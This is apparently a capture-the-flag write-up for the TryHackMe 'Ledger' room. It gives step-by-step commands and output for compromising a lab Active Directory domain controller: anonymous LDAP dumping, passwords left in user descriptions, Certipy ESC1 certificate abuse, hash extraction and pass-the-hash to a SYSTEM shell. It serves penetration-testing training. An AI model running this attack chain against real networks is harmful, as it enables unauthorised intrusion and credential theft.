# [Ledger](https://tryhackme.com/room/ledger)

## This challenge simulates a real cyber-attack scenario where you must exploit an Active Directory.

# Find the Flags

## Can you find all the flags?

### What is the user flag?

1. Perform a comprehensive port scan with service and version detection across all ports to map the attack surface. The results reveal a typical Windows Active Directory environment.

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-16 14:49:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-06-16T14:11:18
|_Not valid after:  2027-06-16T14:11:18
|_ssl-date: 2026-06-16T14:51:52+00:00; 0s from scanner time.
443/tcp   open  ssl/https?
|_ssl-date: 2026-06-16T14:51:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
| tls-alpn:
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?
|_ssl-date: 2026-06-16T14:51:52+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-06-16T14:11:18
|_Not valid after:  2027-06-16T14:11:18
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-06-16T14:11:18
|_Not valid after:  2027-06-16T14:11:18
|_ssl-date: 2026-06-16T14:51:52+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2026-06-16T14:11:18
|_Not valid after:  2027-06-16T14:11:18
|_ssl-date: 2026-06-16T14:51:52+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2026-06-15T14:20:18
|_Not valid after:  2026-12-15T14:20:18
|_ssl-date: 2026-06-16T14:51:52+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-16T14:50:45+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49807/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows
```

2. Add the target's hostnames to the local DNS resolver so that domain-based tools can resolve the DC correctly.

```bash
echo "<TARGET_IP> thm.local labyrinth.thm.local thm-LABYRINTH-CA" >> /etc/hosts
```

3. Perform an anonymous LDAP query against the domain controller. Many AD deployments allow unauthenticated LDAP reads by default, exposing the entire directory. The `-x` flag uses simple authentication, and `-b "dc=thm,dc=local"` sets the search base to the root of the domain.

```bash
ldapsearch -x -H ldap://<TARGET_IP> -b "dc=thm,dc=local" > ldapsearch.txt
```

4. Search through the LDAP dump for accounts whose description attribute contains a plaintext password. This is a well-known AD misconfiguration where administrators store temporary passwords in user descriptions.

```bash
cat ldapsearch.txt| grep -B 2 "description: Please change it:"
```

**Results:**

```
cn: IVY_WILLIS
sn: IVY_WILLIS
description: Please change it: CHANGEME2023!
--
cn: SUSANNA_MCKNIGHT
sn: SUSANNA_MCKNIGHT
description: Please change it: CHANGEME2023!
```

5. Use the discovered credentials to open an RDP session to the domain controller as `SUSANNA_MCKNIGHT`. The `/cert:ignore` flag bypasses the self-signed certificate warning.

```bash
xfreerdp /v:thm-LABYRINTH-CA /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /cert:ignore
```

6. Navigate to the desktop and retrieve the user flag.

[SCREEN01]

---

### What is the root flag?

1. Use Certipy to enumerate Active Directory Certificate Services and identify misconfigured certificate templates. The `-vulnerable` flag filters the output to only show templates that are exploitable.

```bash
certipy-ad find -u SUSANNA_MCKNIGHT@local.thm -p 'CHANGEME2023!' -dc-ip <TARGET_IP> -vulnerable
```

2. Inspect the output JSON to identify the vulnerable template. The `ServerAuth` template is flagged as vulnerable to **ESC1**. It allows enrolled users to supply an arbitrary Subject Alternative Name in their certificate request, meaning a low-privileged user can request a certificate that impersonates any domain account, including Domain Admins.

```bash
cat 20260616145813_Certipy.json
```

3. Exploit the **ESC1** misconfiguration by requesting a certificate using the `ServerAuth` template while specifying `bradley_ortiz@thm.local` as the UPN in the SAN. This tricks ADCS into issuing a certificate that authenticates as `bradley_ortiz`, even though the request was made by `SUSANNA_MCKNIGHT`.

```bash
certipy-ad req -username SUSANNA_MCKNIGHT  -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn bradley_ortiz@thm.local -dns <TARGET_IP> -debug
```

4. Authenticate with the obtained certificate to request a Kerberos TGT and extract the NT hash for `bradley_ortiz`. When prompted with multiple SAN identities, select option `0` to authenticate as `bradley_ortiz@thm.local`.

```bash
certipy-ad auth -pfx bradley_ortiz_10.pfx -dc-ip <TARGET_IP>
```

**Results:**

```
[*] Certificate identities:
[*]     SAN UPN: 'bradley_ortiz@thm.local'
[*]     SAN DNS Host Name: '<TARGET_IP>'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] UPN: 'bradley_ortiz@thm.local' (bradley_ortiz@thm.local)
    [1] DNS Host Name: '<TARGET_IP>' (10$@112.151.16)
> 0
[*] Using principal: 'bradley_ortiz@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bradley_ortiz.ccache'
[*] Wrote credential cache to 'bradley_ortiz.ccache'
[*] Trying to retrieve NT hash for 'bradley_ortiz'
[*] Got hash for 'bradley_ortiz@thm.local': aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d
```

5. Perform a Pass-the-Hash attack using `impacket-psexec` to authenticate as `bradley_ortiz` without knowing the plaintext password. PSExec deploys a service on the target and drops into a shell running as `NT AUTHORITY\SYSTEM`, granting full control over the machine.

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d bradley_ortiz@<TARGET_IP>
```

6. Read the root flag from the Administrator's desktop. The SYSTEM context obtained through PSExec has unrestricted access to all files on the system, including those in other users profile directories.

```bash
type C:\Users\Administrator\Desktop\root.txt
```

[SCREEN02]
